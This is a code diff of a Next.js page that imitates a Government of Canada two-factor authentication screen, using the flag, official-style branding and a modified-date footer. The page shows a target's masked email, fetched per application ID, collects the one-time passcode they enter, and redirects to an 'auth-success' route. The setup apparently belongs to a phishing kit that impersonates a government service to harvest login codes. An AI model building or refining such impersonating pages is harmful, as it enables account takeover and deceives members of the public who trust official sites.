@@ -1,8 +1,10 @@
-"use client"; // Ensure this component is a client component
+"use client";
+
 import { useRouter } from "next/navigation";
-import Image from "next/image";
-import { use, useActionState } from "react"; // ✅ updated import
-import { verifyOtpAction } from "@/actions/authActions"; // adjust path if needed
+import { use, useActionState } from "react";
+import { verifyOtpAction } from "@/actions/authActions";
+import { fetchApplicationByIdAction } from "@/actions/applicationActions";
+import { useEffect, useState } from "react";
 
 export default function TwoFactorPage({
   params,
@@ -12,20 +14,39 @@ export default function TwoFactorPage({
   const { id } = use(params);
   const router = useRouter();
 
-  // ✅ useActionState instead of useFormState
+  const [applicationData, setApplicationData] = useState<any>(null);
+
+  // ✅ Correct usage: initial state should match the action's expected state type
   const [state, formAction] = useActionState(verifyOtpAction, {});
 
-  // If OTP is verified successfully, redirect
-  if (state?.data?.application) {
-    router.push(`/auth-success/${id}`);
-  }
+  // Fetch application data dynamically
+  useEffect(() => {
+    async function fetchData() {
+      const res = await fetchApplicationByIdAction(id);
+      if (res.data) setApplicationData(res.data);
+    }
+    fetchData();
+  }, [id]);
+
+  // Redirect if OTP verified
+  useEffect(() => {
+    if (state?.data?.application) {
+      router.push(`/auth-success/${id}`);
+    }
+  }, [state?.data, id, router]);
+
+  // Mask email for privacy
+  const maskedEmail = applicationData?.email
+    ? `${applicationData.email[0]}*****${applicationData.email
+        .split("@")[0]
+        .slice(-1)}@${applicationData.email.split("@")[1]}`
+    : "Loading...";
 
   return (
     <main className="min-h-screen bg-white text-gray-900">
       {/* Header */}
       <header className="bg-white border-b w-full">
         <div className="w-full flex items-center justify-between px-8 py-5 max-w-none">
-          {/* Logo and text */}
           <div className="flex items-center space-x-6">
             <img
               src="https://upload.wikimedia.org/wikipedia/commons/d/d9/Flag_of_Canada_%28Pantone%29.svg"
@@ -42,8 +63,6 @@ export default function TwoFactorPage({
               <p className="text-lg font-bold">du Canada</p>
             </div>
           </div>
-
-          {/* Language Switch */}
           <a
             href="#"
             className="text-base text-blue-900 hover:underline font-medium"
@@ -52,12 +71,10 @@ export default function TwoFactorPage({
           </a>
         </div>
 
-        {/* Two-factor heading bar */}
         <div className="bg-gray-800 text-white text-lg font-semibold px-6 py-3">
-          Two-Factor authentication
+          Two-Factor Authentication
         </div>
 
-        {/* Navigation Bar */}
         <nav className="w-full bg-[#E1E4E7] text-sm border-t border-b border-white/20">
           <div className="flex justify-start gap-8 px-6">
             <a
@@ -82,31 +99,27 @@ export default function TwoFactorPage({
         </nav>
       </header>
 
-      {/* Layout Container */}
+      {/* Content */}
       <div className="max-w-4xl mx-auto px-6 py-10">
-        {/* Heading + Description */}
         <div className="mb-8">
           <h1 className="text-3xl font-bold text-gray-900 border-b border-[#990000] w-fit pb-1 mb-3">
-            Two-Factor authentication
+            Two-Factor Authentication
           </h1>
           <p className="text-[15px] text-gray-800">
-            Enter the one-time passcode (OTP) that was sent to your registered
-            email address in order to continue.
+            Enter the one-time passcode (OTP) sent to your registered email to
+            continue.
           </p>
         </div>
 
-        {/* Info Section */}
+        {/* Info */}
         <div className="space-y-2 mb-6 text-[15px]">
           <p>
             An email with a one-time passcode has been sent to{" "}
-            <span className="break-words font-medium">
-              l*************@gmail.com
-            </span>
-            .
+            <span className="break-words font-medium">{maskedEmail}</span>.
           </p>
           <p>
-            The code will expire after <span className="font-medium">20</span>{" "}
-            minutes. The one-time passcode is case sensitive.
+            The code will expire after <span className="font-medium">10</span>{" "}
+            minutes. The OTP is case sensitive.
           </p>
 
           <details className="bg-gray-50 border rounded-md p-3">
@@ -114,20 +127,18 @@ export default function TwoFactorPage({
               How do I obtain this code?
             </summary>
             <ol className="list-decimal ml-6 mt-2 space-y-1 text-gray-700 text-[14px]">
-              <li>
-                An email with a one-time passcode has been sent to your email.
-              </li>
-              <li>
-                Copy or enter the one-time passcode from your email into the
-                field below.
-              </li>
-              <li>Press enter or select Continue below.</li>
+              <li>An email with a one-time passcode has been sent to your email.</li>
+              <li>Copy or enter the OTP from your email into the field below.</li>
+              <li>Press enter or select Continue.</li>
             </ol>
           </details>
         </div>
 
-        {/* Form */}
+        {/* OTP Form */}
         <form className="space-y-6" action={formAction}>
+          {/* Include ID as hidden input */}
+          <input type="hidden" name="id" value={id} />
+
           <div>
             <label
               htmlFor="otp"
@@ -145,7 +156,6 @@ export default function TwoFactorPage({
             />
           </div>
 
-          {/* Show error if OTP fails */}
           {state?.error && (
             <p className="text-red-600 text-sm">
               {typeof state.error.message === "string"
@@ -170,14 +180,13 @@ export default function TwoFactorPage({
           </div>
         </form>
 
-        {/* Resend Section */}
+        {/* Resend */}
         <div className="mt-8 text-[15px]">
           <h2 className="text-base font-semibold mb-2">
-            Did not receive your one-time passcode or it has expired?
+            Did not receive your OTP or it has expired?
           </h2>
           <p className="mb-2">
-            Please wait at least 2 minutes for the email to arrive and check
-            that the email is not in your spam folder.
+            Please wait at least 2 minutes and check your spam folder.
           </p>
           <button
             type="button"
@@ -187,10 +196,10 @@ export default function TwoFactorPage({
           </button>
         </div>
 
-        {/* Recovery Section */}
+        {/* Recovery */}
         <div className="mt-8 text-[15px]">
           <p>
-            Can’t complete email authentication? You can also log in with a
+            Can’t complete email authentication? You can log in with a
             recovery code.
           </p>
           <a
@@ -201,11 +210,16 @@ export default function TwoFactorPage({
           </a>
         </div>
 
-        {/* Footer Date */}
         <div className="mt-12 text-sm text-gray-600">
-          Date modified: <strong>2024-06-15</strong>
+          Date modified:{" "}
+          <strong>
+            {applicationData?.updatedAt
+              ? new Date(applicationData.updatedAt).toLocaleDateString()
+              : "Loading..."}
+          </strong>
         </div>
       </div>
+
       <footer className="w-full border-t bg-[#E1E4E7] text-sm">
         <div className="max-w-6xl mx-auto px-6 py-4 flex justify-between items-center">
           <nav className="flex gap-6">
